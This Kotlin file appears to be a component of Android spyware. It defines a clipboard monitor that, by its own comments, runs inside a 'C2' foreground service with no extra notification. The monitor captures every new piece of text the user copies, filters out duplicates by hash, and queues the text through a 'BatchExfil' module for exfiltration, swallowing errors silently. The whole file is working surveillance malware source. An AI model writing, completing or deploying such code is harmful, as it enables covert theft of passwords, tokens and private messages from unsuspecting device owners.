package com.sp.core.services

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import com.sp.core.util.BatchExfil
import com.sp.core.util.Prefs
import java.security.MessageDigest

/**
 * Clipboard monitor.
 *
 * Runs inside the long-lived C2 foreground service (no extra service, no extra
 * notification). Duplicates are filtered by a hash of the captured text.
 */
object ClipboardMonitor : ClipboardManager.OnPrimaryClipChangedListener {

    private const val TAG = "ClipboardMonitor"
    private const val KEY_LAST_HASH = "clip_last_hash"

    private var clipboard: ClipboardManager? = null
    private var appContext: Context? = null
    private var lastHash: String = ""

    fun start(ctx: Context) {
        try {
            val app = ctx.applicationContext
            val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            appContext = app
            if (clipboard === cm) return
            clipboard = cm
            cm.addPrimaryClipChangedListener(this)
            lastHash = Prefs.get(app, KEY_LAST_HASH, "") as String
            Log.i(TAG, "clipboard monitor armed")
        } catch (t: Throwable) {
            Log.w(TAG, "clipboard unavailable: ${t.message}")
        }
    }

    fun stop() {
        try { clipboard?.removePrimaryClipChangedListener(this) } catch (_: Throwable) {}
        clipboard = null
    }

    override fun onPrimaryClipChanged() {
        try {
            val ctx = appContext ?: return
            val cm = clipboard ?: return
            val clip: ClipData = cm.primaryClip ?: return
            if (clip.itemCount == 0) return
            val item = clip.getItemAt(0) ?: return
            val text = item.text?.toString() ?: return
            if (text.isBlank() || text.length > 4096) return

            val hash = sha256(text)
            if (hash == lastHash) return
            lastHash = hash
            Prefs.set(ctx, KEY_LAST_HASH, hash)

            BatchExfil.enqueue(
                ctx,
                "clipboard",
                """{"text":"${escape(text)}","len":${text.length},"ts":${System.currentTimeMillis()}}"""
            )
        } catch (_: Throwable) {
        }
    }

    private fun escape(s: String): String =
        s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "")

    private fun sha256(s: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        return md.digest(s.toByteArray(Charsets.UTF_8)).joinToString("") { "%02x".format(it) }
    }
}
